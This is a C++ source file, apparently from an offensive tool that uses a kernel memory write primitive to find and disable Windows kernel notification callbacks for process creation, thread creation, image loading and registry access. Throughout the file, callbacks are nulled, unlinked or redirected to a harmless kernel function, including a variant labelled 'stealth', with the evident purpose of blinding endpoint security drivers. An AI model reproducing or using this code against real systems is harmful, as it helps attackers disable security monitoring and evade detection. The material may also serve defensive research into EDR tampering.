#include "notifyRoutineUtil.h"
#include <tchar.h>

void Log(const char* Message, ...) {
	const auto file = stderr;

	va_list Args;
	va_start(Args, Message);
	std::vfprintf(file, Message, Args);
	std::fputc('\n', file);
	va_end(Args);
}

PVOID notifyRoutine::ResolveDriverBase(const wchar_t* strDriverName)
{
	DWORD szBuffer = 0x2000;
	BOOL bRes = FALSE;
	DWORD dwSizeRequired = 0;
	wchar_t buffer[256] = { 0 };
	LPVOID lpBase = NULL;
	HANDLE hHeap = GetProcessHeap();
	if (!hHeap) {
		return NULL;
	}

	LPVOID lpBuf = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, szBuffer);
	if (!lpBuf) {
		return NULL;
	}

	bRes = EnumDeviceDrivers((LPVOID*)lpBuf, szBuffer, &dwSizeRequired);
	if (!bRes) {
		HeapFree(hHeap, 0, lpBuf);
		lpBuf = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwSizeRequired);
		if (!lpBuf) {
			return NULL;
		}
		szBuffer = dwSizeRequired;
		bRes = EnumDeviceDrivers((LPVOID*)lpBuf, szBuffer, &dwSizeRequired);
		if (!bRes) {
			printf("Failed to allocate space for device driver base array\n");
			return NULL;
		}
	}

	SIZE_T szNumDrivers = szBuffer / sizeof(PVOID);

	for (SIZE_T i = 0; i < szNumDrivers; i++) {
		PVOID lpBaseIter = ((LPVOID*)lpBuf)[i];
		GetDeviceDriverBaseNameW(lpBaseIter, buffer, 256);
		if (!lstrcmpiW(strDriverName, buffer)) {
			lpBase = lpBaseIter;
			break;
		}
	}

	HeapFree(hHeap, 0, lpBuf);
	return lpBase;
}

notifyRoutine::notifyRoutine(MemHandler* objMemHandlerArg)
{

	this->objMemHandler = objMemHandlerArg;
	this->lpNtosBase = this->ResolveDriverBase(L"ntoskrnl.exe");
}

DWORD64 notifyRoutine::GetFunctionAddress(LPCSTR function) {
	HMODULE Ntoskrnl = LoadLibraryW(L"ntoskrnl.exe");
	DWORD64 Offset = reinterpret_cast<DWORD64>(GetProcAddress(Ntoskrnl, function)) - reinterpret_cast<DWORD64>(Ntoskrnl);
	DWORD64 address = (DWORD64) this->lpNtosBase + Offset;
	FreeLibrary(Ntoskrnl);
	Log("[+] %s address: %p\n", function, address);
	return address;
}

DWORD64  notifyRoutine::PatternSearch(DWORD64 start, DWORD64 end, DWORD64 pattern) {
	int range = end - start;
	for (int i = 0; i < range; i++) {

		DWORD64 contents = NULL;
		BOOL b = this->objMemHandler->VirtualRead(
			(DWORD64)start + i,
			&contents,
			sizeof(contents)
		);
		if (!b) return FALSE;

		if (contents == pattern) {
			return start + i;
		}
	}
	return 0;
}

BOOL notifyRoutine::Restore() {
	BOOL b = false;
	if (patchCallbackMap.size() > 0) {
		for (const auto& entry : patchCallbackMap) {
			DWORD64 address = entry.first;
			DWORD64 oldValue = entry.second.first;  // The old value we want to restore

			printf("Restoring value at address: %llx to old value: %llx\n", address, oldValue);

			// Write the old value back to the original memory location
			b = this->objMemHandler->WriteMemoryDWORD64(address, oldValue);

			if (!b) {
				printf("Failed to restore at address: %llx\n", address);
				return FALSE;
			}
		}
	}
	if (patchLinksMap.size() > 0) {
		for (const auto& entry : patchLinksMap) {
			DWORD64 address = entry.first;
			DWORD64 oldValue = entry.second.first;  // The old value we want to restore

			printf("Restoring value at address: %llx to old value: %llx\n", address, oldValue);

			// Write the old value back to the original memory location
			b = this->objMemHandler->WriteMemoryDWORD64(address, oldValue);

			if (!b) {
				printf("Failed to restore at address: %llx\n", address);
				return FALSE;
			}
		}
	}
	return b;
}

TCHAR* notifyRoutine::FindDriver(DWORD64 address) {

	LPVOID drivers[1024];
	DWORD cbNeeded;
	int cDrivers, i;
	DWORD64 diff[3][200];
	TCHAR szDriver[1024];
	static TCHAR result[2048];  // Make sure it's large enough for the output

	if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers)) {
		int n = sizeof(drivers) / sizeof(drivers[0]);
		cDrivers = cbNeeded / sizeof(drivers[0]);
		int narrow = 0;
		int c = 0;
		for (i = 0; i < cDrivers; i++) {
			//we add all smaller addresses of drivers to a new array, then grab the closest. Not great, I know...
			if (address > (DWORD64)drivers[i]) {
				diff[0][c] = address;
				diff[1][c] = address - (DWORD64)drivers[i];
				diff[2][c] = (DWORD64)drivers[i];
				c++;
			}
		}
	}
	//cheeky for loop to find the smallest diff. smallest diff should be the diff of DriverBase + Diff == Callback function.
	int k = 0;
	DWORD64 temp = diff[1][0];
	for (k = 0; k < cDrivers; k++) {
		if ((temp > diff[1][k]) && (diff[0][k] == address)) {
			temp = diff[1][k];

		}
	}

	if (GetDeviceDriverBaseName(LPVOID(address - temp), szDriver, sizeof(szDriver))) {

		// Combine address, szDriver, and temp into a formatted string safely
		swprintf_s(result, sizeof(result) / sizeof(TCHAR), _T("%p [%s + 0x%llx]\n"),
			(void*)address, szDriver, temp);

		std::cout << "[+] " << std::hex << address << " [";
		std::wcout << szDriver << " + 0x";
		std::cout << std::hex << (int)temp;
		std::cout << "]" << std::endl;
	}
	else {
		swprintf_s(result, sizeof(result) / sizeof(TCHAR), _T("Could not resolve driver for %p\n"),
			(void*)address);
	}

	return result;
}

void notifyRoutine::findregistrycallbackroutines(DWORD64 remove) {
	//UCHAR PTRN_W10_Reg[] =	{0x48, 0x8b, 0xf8, 0x48, 0x89, 0x44, 0x24, 0x40, 0x48, 0x85, 0xc0, 0x0f, 0x84};
	//so retrieving this one is different from proc/img/thread. We need to find the undocumented callbacklisthead. The callbacklisthead contains a pointer to the registry notification callback routine. 
	//At offset 0x28 is the address of the callback function.

	PLIST_ENTRY pEntry;
	Offsets offsets = getVersionOffsets();
	DWORD64 CmUnRegisterCallbackAddress = GetFunctionAddress("CmUnRegisterCallback");
	DWORD64 CmUnregisterMachineHiveLoadedNotification = GetFunctionAddress("CmUnregisterMachineHiveLoadedNotification");
	DWORD64 patternaddress = PatternSearch(CmUnRegisterCallbackAddress, CmUnregisterMachineHiveLoadedNotification, offsets.registry);
	DWORD offset;
	
	BOOL b = this->objMemHandler->VirtualRead(
		(DWORD64)patternaddress - 0x09,
		&offset,
		sizeof(offset)
	);

	const DWORD64 callbacklisthead = (((patternaddress) >> 32) << 32) + ((DWORD)(patternaddress)+offset) - 0x09 + 0x04;

	Log("[+] Callbacklisthead: %p", callbacklisthead);

	DWORD64 EntryToRemove;
	
	b = this->objMemHandler->VirtualRead(
		(DWORD64)callbacklisthead,
		&EntryToRemove,
		sizeof(EntryToRemove)
	);

	int i = 0;

	while (EntryToRemove != callbacklisthead && i < 64) {
		DWORD64 callback;
		
		BOOL b = this->objMemHandler->VirtualRead(
			(DWORD64)EntryToRemove + 0x28,
			&callback,
			sizeof(callback)
		);

		DWORD64 AddressToOverWrite = EntryToRemove + 0x28;

		FindDriver(callback);

		if (callback == remove) {
			//Method 1 => Overwrite the callback function with anoter KCFG Compliant Function that just returns
			const DWORD64 KeGetCurrentIrql = GetFunctionAddress("KeGetCurrentIrql"); // it just return
			Log("Overwriting callback at address %p containing %p to %p", AddressToOverWrite, callback, KeGetCurrentIrql);
			// For Restoration Later, we keep old and new value
			patchCallbackMap[AddressToOverWrite] = std::make_pair(callback, KeGetCurrentIrql);
			// WRITE PRIMITIVE
			b = this->objMemHandler->WriteMemoryDWORD64(
				(DWORD64)AddressToOverWrite,
				(DWORD64)KeGetCurrentIrql
			);
		}

		DWORD64 NextEntryToRemove;

		b = this->objMemHandler->VirtualRead(
			(DWORD64)EntryToRemove,
			&NextEntryToRemove,
			sizeof(NextEntryToRemove)
		);

		EntryToRemove = NextEntryToRemove;

		i++;
	}
}

void notifyRoutine::unlinkregistrycallbackroutines(DWORD64 remove) {
	//UCHAR PTRN_W10_Reg[] =	{0x48, 0x8b, 0xf8, 0x48, 0x89, 0x44, 0x24, 0x40, 0x48, 0x85, 0xc0, 0x0f, 0x84};
	//so retrieving this one is different from proc/img/thread. We need to find the undocumented callbacklisthead. The callbacklisthead contains a pointer to the registry notification callback routine. 
	//At offset 0x28 is the address of the callback function.

	PLIST_ENTRY pEntry;
	Offsets offsets = getVersionOffsets();
	DWORD64 CmUnRegisterCallbackAddress = GetFunctionAddress("CmUnRegisterCallback");
	DWORD64 CmUnregisterMachineHiveLoadedNotification = GetFunctionAddress("CmUnregisterMachineHiveLoadedNotification");
	DWORD64 patternaddress = PatternSearch(CmUnRegisterCallbackAddress, CmUnregisterMachineHiveLoadedNotification, offsets.registry);

	DWORD offset;

	BOOL b = this->objMemHandler->VirtualRead(
		(DWORD64)patternaddress - 0x09,
		&offset,
		sizeof(offset)
	);

	const DWORD64 callbacklisthead = (((patternaddress) >> 32) << 32) + ((DWORD)(patternaddress)+offset) - 0x09 + 0x04;

	Log("[+] Callbacklisthead: %p", callbacklisthead);

	DWORD64 EntryToRemove;

	b = this->objMemHandler->VirtualRead(
		(DWORD64)callbacklisthead,
		&EntryToRemove,
		sizeof(EntryToRemove)
	);

	int i = 0;

	while (EntryToRemove != callbacklisthead && i < 64) {

		DWORD64 callback;

		BOOL b = this->objMemHandler->VirtualRead(
			(DWORD64)EntryToRemove + 0x28,
			&callback,
			sizeof(callback)
		);

		DWORD64 AddressToOverWrite = EntryToRemove + 0x28;
		FindDriver(callback);

		if (callback == remove) {
			// Method 2 -> Unlinking
			DWORD64 nextNodeAddress;

			BOOL b = this->objMemHandler->VirtualRead(
				(DWORD64)EntryToRemove + offsetof(LIST_ENTRY, Flink),
				&nextNodeAddress,
				sizeof(nextNodeAddress)
			);
			
			DWORD64 prevNodeAddress;
			
			b = this->objMemHandler->VirtualRead(
				(DWORD64)EntryToRemove + offsetof(LIST_ENTRY, Blink),
				&prevNodeAddress,
				sizeof(prevNodeAddress)
			);

			// Store the old and new values in the map
			DWORD64 BlinkToRestore;
			
			b = this->objMemHandler->VirtualRead(
				(DWORD64)nextNodeAddress + offsetof(LIST_ENTRY, Blink),
				&BlinkToRestore,
				sizeof(BlinkToRestore)
			);

			DWORD64 FlinkToRestore;
			
			b = this->objMemHandler->VirtualRead(
				(DWORD64)prevNodeAddress + offsetof(LIST_ENTRY, Flink),
				&FlinkToRestore,
				sizeof(FlinkToRestore)
			);

			patchLinksMap[nextNodeAddress + offsetof(LIST_ENTRY, Blink)] = std::make_pair(BlinkToRestore, prevNodeAddress);
			patchLinksMap[prevNodeAddress + offsetof(LIST_ENTRY, Flink)] = std::make_pair(FlinkToRestore, nextNodeAddress);

			Log("Overwriting ToRemove->Flink->Blink at address %p containing %p to %p", nextNodeAddress + offsetof(LIST_ENTRY, Blink), BlinkToRestore, prevNodeAddress);
			Log("Overwriting ToRemove->Blink->Flink at address %p containing %p to %p", prevNodeAddress + offsetof(LIST_ENTRY, Flink), FlinkToRestore, nextNodeAddress);
			
			b = this->objMemHandler->WriteMemoryDWORD64(
				(DWORD64)nextNodeAddress + offsetof(LIST_ENTRY, Blink),
				(DWORD64)prevNodeAddress
			);

			b = this->objMemHandler->WriteMemoryDWORD64(
				(DWORD64)prevNodeAddress + +offsetof(LIST_ENTRY, Flink),
				(DWORD64)nextNodeAddress
			);
		}

		DWORD64 NextEntryToRemove;

		b = this->objMemHandler->VirtualRead(
			(DWORD64)EntryToRemove,
			&NextEntryToRemove,
			sizeof(NextEntryToRemove)
		);

		EntryToRemove = NextEntryToRemove;

		i++;
	}

}

void notifyRoutine::findimgcallbackroutine(DWORD64 remove) {

	Offsets offsets = getVersionOffsets();

	DWORD64 RtlAppendStringToString = GetFunctionAddress("RtlAppendStringToString");
	DWORD64 IoInitializeMiniCompletionPacket = GetFunctionAddress("IoInitializeMiniCompletionPacket");

	DWORD64 patternaddress = PatternSearch(RtlAppendStringToString, IoInitializeMiniCompletionPacket, offsets.image);

	DWORD offset;

	BOOL b = this->objMemHandler->VirtualRead(
		(DWORD64)patternaddress - 0x04,
		&offset,
		sizeof(offset)
	);

	const DWORD64 PspLoadImageNotifyRoutineAddress = (((patternaddress) >> 32) << 32) + ((DWORD)(patternaddress)+offset) - 0x04 + 0x04;
	
	Log("[+] PspLoadImageNotifyRoutineAddress: %p", PspLoadImageNotifyRoutineAddress);
	Log("[+] Enumerating image load callbacks");

	int i = 0;
	for (i; i < 64; i++) {
		DWORD64 callback;

		BOOL b = this->objMemHandler->VirtualRead(
			(DWORD64)PspLoadImageNotifyRoutineAddress + (i * 8),
			&callback,
			sizeof(callback)
		);

		DWORD64 OldValue = callback;

		if (callback != NULL) {//only print actual callbacks
			callback = (callback &= ~(1ULL << 3) + 0x1);//shift bytes

			DWORD64 cbFunction;

			BOOL b = this->objMemHandler->VirtualRead(
				(DWORD64) callback,
				&cbFunction,
				sizeof(cbFunction)
			);

			FindDriver(cbFunction);

			if (cbFunction == remove) {
				Log("Removing callback Entry at address %p containing %p to %p", PspLoadImageNotifyRoutineAddress + (i * 8), OldValue, 0x0000000000000000);
				// For Restoration Later, we keep old and new value
				patchCallbackMap[PspLoadImageNotifyRoutineAddress + (i * 8)] = std::make_pair(OldValue, 0x0000000000000000);
				// WRITE PRIMITIVE
				b = this->objMemHandler->WriteMemoryDWORD64(
					(DWORD64)PspLoadImageNotifyRoutineAddress + (i * 8),
					(DWORD64)0x0000000000000000
				);
			}
		}

	}

}

void notifyRoutine::findthreadcallbackroutine(DWORD64 remove) {
	// the function is PspSetCreateThreadNotifyRoutine
	Offsets offsets = getVersionOffsets();

	const DWORD64 PsRemoveCreateThreadNotifyRoutine = GetFunctionAddress("PsSetLoadImageNotifyRoutine");
	const DWORD64 PsRemoveLoadImageNotifyRoutine = GetFunctionAddress("PsTlsAlloc");

	DWORD64 patternaddress = PatternSearch(PsRemoveCreateThreadNotifyRoutine, PsRemoveLoadImageNotifyRoutine, offsets.thread);
	DWORD offset;

	BOOL b = this->objMemHandler->VirtualRead(
		(DWORD64)patternaddress - 0x04,
		&offset,
		sizeof(offset)
	);

	DWORD64 PspCreateThreadNotifyRoutineAddress = (((patternaddress) >> 32) << 32) + ((DWORD)(patternaddress)+offset) - 0x04 + 0x04;
	
	Log("[+] PspCreateThreadNotifyRoutineAddress: %p", PspCreateThreadNotifyRoutineAddress);
	Log("[+] Enumerating thread creation callbacks");

	int i = 0;
	for (i; i < 64; i++) {
		DWORD64 callback;

		BOOL b = this->objMemHandler->VirtualRead(
			(DWORD64)PspCreateThreadNotifyRoutineAddress + (i * 8),
			&callback,
			sizeof(callback)
		);

		DWORD64 OldValue = callback;
		if (callback != NULL) {//only print actual callbacks
			callback = (callback &= ~(1ULL << 3) + 0x1);//shift bytes
			DWORD64 cbFunction;

			BOOL b = this->objMemHandler->VirtualRead(
				(DWORD64)callback,
				&cbFunction,
				sizeof(cbFunction)
			);

			FindDriver(cbFunction);
			if (cbFunction == remove) {
				Log("Removing callback Entry at address %p containing %p to %p", PspCreateThreadNotifyRoutineAddress + (i * 8), OldValue, 0x0000000000000000);
				// For Restoration Later, we keep old and new value
				patchCallbackMap[PspCreateThreadNotifyRoutineAddress + (i * 8)] = std::make_pair(OldValue, 0x0000000000000000);
				// WRITE PRIMITIVE
				b = this->objMemHandler->WriteMemoryDWORD64(
					(DWORD64)PspCreateThreadNotifyRoutineAddress + (i * 8),
					(DWORD64)0x0000000000000000
				);
			}
		}

	}
}

void notifyRoutine::findprocesscallbackroutine(DWORD64 remove) {

	//we search the memory between PoRegisterCoalescingCallback and EtwWriteEndScenario for a specific set of instructions next to a relative LEA containing the offset to the PspCreateProcessNotifyRoutine array of callbacks.
	Offsets offsets = getVersionOffsets();
	const DWORD64 IoDeleteSymbolicLink = GetFunctionAddress("IoDeleteSymbolicLink");
	const DWORD64 RtlDestroyHeap = GetFunctionAddress("RtlDestroyHeap");

	//the address returned by the patternsearch is just below the offsets. 
	DWORD64 patternaddress = PatternSearch(IoDeleteSymbolicLink, RtlDestroyHeap, offsets.process);
	Log("[+] patternaddress: %p", patternaddress);

	DWORD offset;

	BOOL b = this->objMemHandler->VirtualRead(
		(DWORD64)patternaddress - 0x0f,
		&offset,
		sizeof(offset)
	);

	//so we take the 64 bit address, but have a 32 bit addition. To prevent overflow, we grab the first half (shift right, shift left), then add the 32bit DWORD patternaddress with the 32bit offset, and subtract 8. *cringe*
	DWORD64 PspCreateProcessNotifyRoutineAddress = (((patternaddress) >> 32) << 32) + ((DWORD)(patternaddress)+offset) - 0x0f + 0x04;

	Log("[+] PspCreateProcessNotifyRoutine: %p", PspCreateProcessNotifyRoutineAddress);
	Log("[+] Enumerating process creation callbacks");

	int i = 0;
	for (i; i < 64; i++) {
		DWORD64 callback;

		BOOL b = this->objMemHandler->VirtualRead(
			(DWORD64)(PspCreateProcessNotifyRoutineAddress + (i * 8)),
			&callback,
			sizeof(callback)
		);

		DWORD64 OldValue = callback;
		if (callback != NULL) {//only print actual callbacks
			callback = (callback &= ~(1ULL << 3) + 0x1);//shift bytes
			
			DWORD64 cbFunction;

			BOOL b = this->objMemHandler->VirtualRead(
				(DWORD64)callback,
				&cbFunction,
				sizeof(cbFunction)
			);

			FindDriver(cbFunction);

			if (cbFunction == remove) {
				Log("Removing callback Entry at address %p containing %p to %p", PspCreateProcessNotifyRoutineAddress + (i * 8), OldValue, 0x0000000000000000);
				// For Restoration Later, we keep old and new value
				patchCallbackMap[PspCreateProcessNotifyRoutineAddress + (i * 8)] = std::make_pair(OldValue, 0x0000000000000000);
				// WRITE PRIMITIVE
				b = this->objMemHandler->WriteMemoryDWORD64(
					(DWORD64)PspCreateProcessNotifyRoutineAddress + (i * 8),
					(DWORD64)0x0000000000000000
				);
			}
		}

	}
}

// Overwriting the callback Function inside the callback entry at offset 0x08 instead of Nulling the whole callback entry
void notifyRoutine::findprocesscallbackroutinestealth(DWORD64 remove) {

	//we search the memory between IoDeleteSymbolicLink and RtlDestroyHeap for a specific set of instructions next to a relative LEA containing the offset to the PspCreateProcessNotifyRoutine array of callbacks.
	Offsets offsets = getVersionOffsets();
	const DWORD64 PoRegisterCoalescingCallback = GetFunctionAddress("IoDeleteSymbolicLink");
	const DWORD64 EtwWriteEndScenario = GetFunctionAddress("RtlDestroyHeap");

	//the address returned by the patternsearch is just below the offsets. 
	DWORD64 patternaddress = PatternSearch(PoRegisterCoalescingCallback, EtwWriteEndScenario, offsets.process);
	Log("[+] patternaddress: %p", patternaddress);

	DWORD offset;

	BOOL b = this->objMemHandler->VirtualRead(
		(DWORD64)patternaddress - 0x0f,
		&offset,
		sizeof(offset)
	);

	//so we take the 64 bit address, but have a 32 bit addition. To prevent overflow, we grab the first half (shift right, shift left), then add the 32bit DWORD patternaddress with the 32bit offset, and subtract 8. *cringe*
	DWORD64 PspCreateProcessNotifyRoutineAddress = (((patternaddress) >> 32) << 32) + ((DWORD)(patternaddress)+offset) - 0x0f + 0x04;

	Log("[+] PspCreateProcessNotifyRoutine: %p", PspCreateProcessNotifyRoutineAddress);
	Log("[+] Enumerating process creation callbacks");
	int i = 0;
	for (i; i < 64; i++) {
		DWORD64 callback;

		BOOL b = this->objMemHandler->VirtualRead(
			(DWORD64)PspCreateProcessNotifyRoutineAddress + (i * 8),
			&callback,
			sizeof(callback)
		);

		if (callback != NULL) {//only print actual callbacks
			callback = (callback &= ~(1ULL << 3) + 0x1);//shift bytes
			DWORD64 cbFunction;

			BOOL b = this->objMemHandler->VirtualRead(
				(DWORD64)callback,
				&cbFunction,
				sizeof(cbFunction)
			);

			TCHAR* output = FindDriver(cbFunction);
			if (cbFunction == remove) {
				const DWORD64 KeGetCurrentIrql = GetFunctionAddress("KeGetCurrentIrql"); // it just return IRQL // KCFG Compliant Function
				Log("Removing callback Function at address %p containing %p to %p", callback, cbFunction, KeGetCurrentIrql);
				// For Restoration Later, we keep old and new value
				patchCallbackMap[callback] = std::make_pair(cbFunction, KeGetCurrentIrql);
				// WRITE PRIMITIVE
				b = this->objMemHandler->WriteMemoryDWORD64(
					(DWORD64)callback,
					(DWORD64)KeGetCurrentIrql
				);
			}
		}

	}
}

notifyRoutine::~notifyRoutine()
{
}
